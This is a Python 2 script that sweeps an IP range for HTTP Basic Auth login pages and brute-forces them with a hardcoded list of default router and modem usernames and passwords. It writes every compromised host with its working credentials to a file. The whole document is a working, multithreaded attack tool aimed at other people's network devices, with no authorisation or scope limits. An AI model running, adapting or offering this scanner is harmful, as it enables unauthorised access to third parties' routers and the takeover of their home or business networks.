#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import urllib2
import base64
import time
import sys

start_time = None
current_host = None
hosts_scanned = 0
found = []
usernames = ['admin', 'Admin', 'sysadmin', 'superuser', 'comcast', 'root', 'cisco', 'administrator', 'Administrator', 'netman', 'Any', '']
passwords = ['admin', 'sysadmin', 'password', 'changeme', 'comcast', 'root', 'cisco', '1234', '2wire', 'Wireless', 'netgear1', '']
units = [1 << (8 * i) for i in range(3, -1, -1)]

def ip_to_int(ip):
    return sum(int(byte) * unit for (byte, unit) in zip(ip.split('.'), units))

def int_to_ip(i):
    return '.'.join(str((i / bit) & 0xff) for bit in units)

def isBasicAuth(host, timeout):
    response = None
    try:
        response = urllib2.urlopen('http://'+host, timeout=timeout)
    except urllib2.HTTPError as exc:
        response = exc
    except:
        return False
    header = response.info().getheader('WWW-Authenticate')
    if header and header.lower().startswith('basic'):
        return True
    else:
        return False

def update_stats():
    sys.stdout.write('\r|%d\t\t|%d\t\t|%d\t\t|%s.*' % (len(found), int(hosts_scanned / (time.time() - start_time)), threading.activeCount()-1, '.'.join(current_host.split('.')[0:3])))
    sys.stdout.flush()

def brute_force(host, timeout, semaphore_object):
    global found
    global current_host
    global hosts_scanned
    current_host = host
    if isBasicAuth(host, timeout):
        for username in usernames:
            for password in passwords:
                try:
                    openedRequest = urllib2.urlopen(urllib2.Request('http://'+host, None, {'Authorization':'Basic %s' % base64.encodestring('%s:%s' % (username, password)).replace('\n', '')}), timeout=timeout)
                    if openedRequest:
                        if ('router' in openedRequest.read().lower()) | ('modem' in openedRequest.read().lower()):
                            found.append('%s:%s:%s' % (host, username, password))
                            hosts_scanned += 1
                            update_stats()
                            semaphore_object.release()
                            return None
                except:
                    pass
        hosts_scanned += 1
        update_stats()
        semaphore_object.release()
    else:
        hosts_scanned += 1
        update_stats()
        semaphore_object.release()

def main():
    global start_time
    if len(sys.argv) < 6:
        print 'Usage: python %s [START-IP] [END-IP] [OUTPUT-FILE] [THREADS] [TIMEOUT]' % sys.argv[0]
        sys.exit()
    threads = []
    semaphore = threading.BoundedSemaphore(value=int(sys.argv[4]))
    ips = (int_to_ip(i) for i in xrange(ip_to_int(sys.argv[1]), ip_to_int(sys.argv[2])))
    print 'Starting Scan...\nFound\t\tHost/s\t\tThreads\t\tCurrent'
    start_time = time.time()
    for ip in ips:
        semaphore.acquire()
        thread = threading.Thread(target=brute_force, args=(ip, float(sys.argv[5]), semaphore))
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()
    print '\nWriting data to file...'
    with open(sys.argv[3], 'a') as out_file:
        for fd in found:
            out_file.write('http://' + fd + '\n')

if __name__ == '__main__':
    main()
